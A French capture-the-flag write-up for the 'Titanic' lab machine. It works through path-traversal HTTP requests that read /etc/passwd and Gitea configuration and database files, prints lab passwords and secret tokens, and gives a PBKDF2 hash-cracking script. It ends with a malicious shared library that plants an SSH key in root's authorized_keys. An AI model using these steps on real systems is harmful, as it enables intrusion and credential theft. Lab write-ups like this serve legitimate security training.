
# Enumerations

```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Burp Suite

```
GET /download?ticket=../../../../etc/passwd HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Users avec /bin/bash : root et developer

Dans developer :
- bash history vide
- authorized key vide
- .profile et .bashrc => rien d'intéressant

Dans les logs :
- apache2 RAS

Dans /etc/hosts

```
127.0.0.1 localhost titanic.htb dev.titanic.htb
```

```ssh conf
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games


UsePAM yes

X11Forwarding yes

PrintMotd no
PrintLastLog no

AcceptEnv LANG LC_*

Subsystem	sftp	/usr/lib/openssh/sftp-server

```

http://dev.titanic.htb/developer/docker-config/src/branch/main/mysql/docker-compose.yml
```
|`MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'`|
|`MYSQL_DATABASE: tickets`|
|`MYSQL_USER: sql_svc`|
`MYSQL_PASSWORD: sql_password`
```

Requete :
```
GET /download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Réponse :
```
HTTP/1.1 200 OK
Date: Sat, 15 Feb 2025 22:54:20 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../home/developer/gitea/data/gitea/conf/app.ini"
Content-Type: application/octet-stream
Content-Length: 2004
Last-Modified: Fri, 02 Aug 2024 10:42:14 GMT
Cache-Control: no-cache
ETag: "1722595334.8970726-2004-2123241728"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

```
GET /download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Dans la BDD, on retrouve des infos intéressantes dans la table users :

```python
import hashlib
import binascii

# Paramètres extraits de la base de données Gitea
# Le salt utilisé pour PBKDF2 est celui-ci (16 octets)
salt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')
# Le hachage cible (50 octets, soit 100 hexadécimaux)
target = binascii.unhexlify('e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56')
iterations = 50000
dklen = 50

def pbkdf2_hash(password: str) -> bytes:
    """Calcule le hachage PBKDF2-HMAC-SHA256 du mot de passe donné."""
    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, iterations, dklen)

dict_file = '/usr/share/wordlists/rockyou.txt'

print("Démarrage du cracking PBKDF2...")
found = False
with open(dict_file, 'r', encoding='utf-8', errors='ignore') as f:
    for line in f:
        pwd = line.strip()
        if not pwd:
            continue
        derived = pbkdf2_hash(pwd)
        # Vous pouvez décommenter la ligne suivante pour voir le test en temps réel :
        # print(f"Trying: {pwd} -> {binascii.hexlify(derived).decode()}")
        if derived == target:
            print(f"[+] Mot de passe trouvé : {pwd}")
            found = True
            break

if not found:
    print("[-] Mot de passe non trouvé dans le dictionnaire.")

```

```sh
python3 crack_dev.py                                                                                    
Démarrage du cracking PBKDF2...
[+] Mot de passe trouvé : 25282528
```


Connection SSH :

```
developer@titanic:~$ cat user.txt 
0a494ae=============2720c12da2
```

# PrivEsc 

Path vuln : 
```
/home/developer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin 
```


```
developer@titanic:/tmp$ chmod +x pspy64 
developer@titanic:/tmp$ ./pspy64

2025/02/16 13:25:27 CMD: UID=1000  PID=32818  | ./pspy64 
2025/02/16 13:25:27 CMD: UID=1000  PID=10854  | -bash 
2025/02/16 13:25:27 CMD: UID=1000  PID=10756  | /lib/systemd/systemd --user 
2025/02/16 13:25:27 CMD: UID=1000  PID=1661   | /usr/local/bin/gitea web 
2025/02/16 13:25:27 CMD: UID=1000  PID=1149   | /usr/bin/python3 /opt/app/app.py 
```

La version de Magik est vulnérable et il est lancé régulièrement avec cron 

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

Creation de clé ssh :
```sh
ssh-keygen -t rsa -b 4096
```

Exploitation : 
```sh
/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libssh_key_injector.so - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){

    // Ajouter la clé SSH dans le fichier authorized_keys
    system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC05mElhIEdaw5BnecgO2ORGuPkhtnMqHAQQ3CjRDO63vGVbEaHfjsNcrYTHEhuEjtSu2utS+IyBeCq1/BIG3LhcnQPF+38dA7tXMIFBGd+H5YyBp5/9CDDJf6y4KEqkvf4EGCM+0WVgsQn0QwPB2G4aixEHAJDgD5ws+qrXUrvVL70jE7DVeSZO+4DKYxPFHYD+Dma+p+37hjk0wvEM2gG4FT5l6hAz9ys9w+HoFOVwWKlJF1hjF0BEJCdtM6PXXl/Hca6i9CZ2ZO8FTdQs1wA5Bknfof90v54eR+4KY+IIALsZ8Re8mlcw/TVSvhhSzsL6josMXXdhiGBYt8pLp2POmeDCFW0zxnbncRfC/UTCo3reCfAq/jn8mwyUai4nGSlx8UDINVaWw/YOseg5ilbMIRW+C1wtUOeHCpRN6aPsIC2IuJ8JSv5cSEeT2qc5aNOA4jrPWT5V4Z4YZgl/jRsM49VOB4zR9U/IIPfHnoLg7plxmC5RiakhV3m3JOZCUG9kfzA3MlwIZYxSQ10xPwdX2A4EAUnhlZm8D2mJU4r0RjKnfJwEJ1QH9+HxQEUBI9WfZy26WDcX4TsqCDzPu26G/CmXM9gXDQx0d+HcTiQiQqGxelUO1GIMJ3xwu0Uhv5dvdkhuyAhpsOkJqHpOrQIuvfJe5i40rRvU0Lml6Sycw== developer@titanic' >> /root/.ssh/authorized_keys");

    // Fixer les permissions du fichier authorized_keys
    system("chmod 600 /root/.ssh/authorized_keys");

    // Terminer l'exécution
    exit(0);
}
EOF
```


```sh

ssh -i id_rsa root@10.129.115.198
...
root@titanic:~# cat root.txt 
aca82df=============cf09ac445b
```
